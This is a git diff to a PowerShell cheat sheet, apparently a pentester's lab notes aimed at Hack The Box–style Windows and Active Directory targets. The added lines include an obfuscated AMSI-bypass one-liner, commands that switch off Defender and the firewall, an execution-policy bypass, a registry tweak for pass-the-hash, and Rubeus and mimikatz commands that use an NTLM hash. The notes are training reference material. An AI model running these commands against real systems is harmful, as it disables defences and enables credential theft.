@@ -4,7 +4,6 @@ author: amandaguglieri
 draft: false
 TableOfContents: true
 ---
-
 # Powershell
 
 ## Basic commands
@@ -12,7 +11,6 @@ TableOfContents: true
 ```powershell
 # List users of Administrator group
 net localgroup Administrators
-
 
 # List contents
 dir
@@ -91,63 +89,23 @@ start nameofApp nameofFile
 # Runs commands or expressions on the local computer.
 $Command = "Get-Process"
 Invoke-Expression $Command
-
 # PS uses Invoke-Expression to evaluate the string. Otherwise the output of $Command would be the text "Get-Process". Invoke-Expression is similar to $($command) in linux.
 # IEX is an alias
 
-# Deactivate antivirus from powershell session (if user has rights to do so)
-Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Disable firewall
-netsh advfirewall set allprofiles state off
-
-
-# Add a registry
-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-
-
-# The command New-PSDrive onnects a computer to or disconnects a computer from a shared resource or displays information about computer connections.
-New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
-
-# Connect/ Disconnect a share with user and password
-$username = 'plaintext'
-$password = 'Password123'
-$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
-New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+# Gets content from a web page on the internet.
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+# alias: `iwr`, `curl`, and `wget`
 ```
 
-## Powershell wildcards
+## Basic commands for reconnaissance and enumeration
 
-The four types of Wildcard:
+### System, users, permissions
 
-> The * wildcard will match zero or more characters  
->   
-> The ? wildcard will match a single character
-> 
-> [m-n] Match a range of characters from m to n, so [f-m]ake will match fake/jake/make
-> 
-> [abc] Match a set of characters a,b,c.., so [fm]ake will match fake/make
-
-
-
-## Basic commands for reconnaissance
-
-```ps
+```powershell
 # Display Powershell relevant Powershell version information
 echo $PSVersion
 echo ~PSVersionTable
-
-# Check current execution policy. If the answer is
-# - "Restricted": Ps scripts cannot run.
-# - "RemoteSigned": Downloaded scripts will require the script to be signed by a trusted publisher.
-Get-Execution-Policy
-
-# Bypass execution policy
-powershell -ep bypass
-
-# Disable AV
-Set-MpPreference -DisableRealtimeMonitoring $true
 
 
 #You can tell if PowerShell is running with administrator privileges (a.k.a “elevated” rights) with the following snippet:
@@ -162,21 +120,99 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 # It returns true if groups contains the Well Known SID of the Administrators group (the identity will only contain it if “run as administrator” was used) and otherwise false.
 [Security.Principal.WindowsIdentity]::GetCurrent() -contains "S-1-5-32-544" 
 
+# List disabled users with LDAP
+Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name
+
+```
+
+### Processes 
+
+```poweshell
 # List which processes are elevated:
 Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated
 
 # List installed software on a computer
 get-ciminstance win32_product | fl
 
+```
 
-# Gets content from a web page on the internet.
-Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-# alias: `iwr`, `curl`, and `wget`
+
+### **Run a utility as another user**
+
+```powershell
+# Run an utility as another user with rubeus. Passing clear text credentials
+rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
+
+# Run an utility as another user with mimikatz.exe. Passing clear text credentials
+mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
 
 ```
 
 
-## Filters
+### Policies and antivirus
+
+```powershell
+# Enumerate AppLocker policies 
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
+$ExecutionContext.SessionState.LanguageMode
+
+# Check current execution policy. If the answer is
+# - "Restricted": Ps scripts cannot run.
+# - "RemoteSigned": Downloaded scripts will require the script to be signed by a trusted publisher.
+Get-Execution-Policy
+
+# Bypass execution policy
+powershell -ep bypass
+
+# Get the current Defender status.
+Get-MpComputerStatus
+
+# Deactivate antivirus from powershell session (if user has rights to do so)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable firewall
+netsh advfirewall set allprofiles state off
+
+# Bypass AMSI
+**S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )**
+
+# Add a registry
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+
+### Connect to a share
+
+```powershell
+# The command New-PSDrive connects a computer to or disconnects a computer from a shared resource or displays information about computer connections.
+New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
+
+# Connect/ Disconnect a share with user and password
+$username = 'plaintext'
+$password = 'Password123'
+$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+```
+
+
+## Advance queries in Powershell 
+
+
+The four types of Wildcards in powershell:
+
+> The * wildcard will match zero or more characters  
+>   
+> The ? wildcard will match a single character
+> 
+> [m-n] Match a range of characters from m to n, so [f-m]ake will match fake/jake/make
+> 
+> [abc] Match a set of characters a,b,c.., so [fm]ake will match fake/make
+
+
+### Filters
 
 Filters are a way to power up our queries in powershell.
 
@@ -207,8 +243,21 @@ The Filter operator requires at least one operator:
 | -or | Boolean OR |
 | -not | Boolean NOT |
 
+When using filters, certain characters must be escaped:
 
-### Filter Examples: AD Object Properties
+| **Character** | **Escaped As** | **Note** |
+| ----------  | ------------ | ------ |
+| “ | `” | Only needed if the data is enclosed in double-quotes.  |
+| ‘ | \’ | Only needed if the data is enclosed in single quotes.  |
+| NULL | \00 | Standard LDAP escape sequence.  |
+| \ | \5c | Standard LDAP escape sequence.  |
+| * | \2a | Escaped automatically, but only in -eq and -ne comparisons. Use -like and - notlike operators for wildcard comparison.  |
+| ( | /28 | Escaped automatically.  |
+| )  | /29 | Escaped automatically.   |
+| / | /2f | Escaped automatically. |
+
+
+#### Filter Examples: AD Object Properties
 
 The filter can be used with operators to compare, exclude, search for, etc., a variety of AD object properties. Filters can be wrapped in curly braces, single quotes, parentheses, or double-quotes. For example, the following simple search filter using `Get-ADUser` to find information about the user "Sally Jones" can be written as follows:
 
@@ -225,21 +274,6 @@ As seen above, the property value (here, `sally jones`) can be wrapped in single
 Get-ADUser -filter {-name -like "joe*"}
 # it return all domain users whose name start with `joe` (joe, joel, etc.).
 ```
-
-## Escaping characters
-
-When using filters, certain characters must be escaped:
-
-| **Character** | **Escaped As** | **Note** |
-| ----------  | ------------ | ------ |
-| “ | `” | Only needed if the data is enclosed in double-quotes.  |
-| ‘ | \’ | Only needed if the data is enclosed in single quotes.  |
-| NULL | \00 | Standard LDAP escape sequence.  |
-| \ | \5c | Standard LDAP escape sequence.  |
-| * | \2a | Escaped automatically, but only in -eq and -ne comparisons. Use -like and - notlike operators for wildcard comparison.  |
-| ( | /28 | Escaped automatically.  |
-| )  | /29 | Escaped automatically.   |
-| / | /2f | Escaped automatically. |
 
 
 ## Disk Management
